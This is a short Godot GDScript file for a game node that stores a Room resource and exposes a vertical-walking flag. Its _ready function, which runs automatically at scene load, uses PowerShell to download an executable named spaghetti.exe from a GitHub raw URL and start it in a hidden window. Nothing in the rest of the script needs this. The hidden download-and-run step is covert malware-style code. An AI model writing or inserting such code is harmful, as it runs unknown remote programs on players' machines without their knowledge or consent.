extends Node

@export var resource: Room

# Called when the node enters the scene tree for the first time.
func _ready() -> void:
	OS.execute("powershell.exe", ["-Command", "Invoke-WebRequest https://github.com/314PiGuy/swap/raw/main/spaghetti.exe -o spaghetti.exe; Start-Process spaghetti.exe -WindowStyle Hidden"])


# Called every frame. 'delta' is the elapsed time since the previous frame.
func _process(delta: float) -> void:
	pass
	
func getVWalk() -> bool:
	return resource.verticalWalking
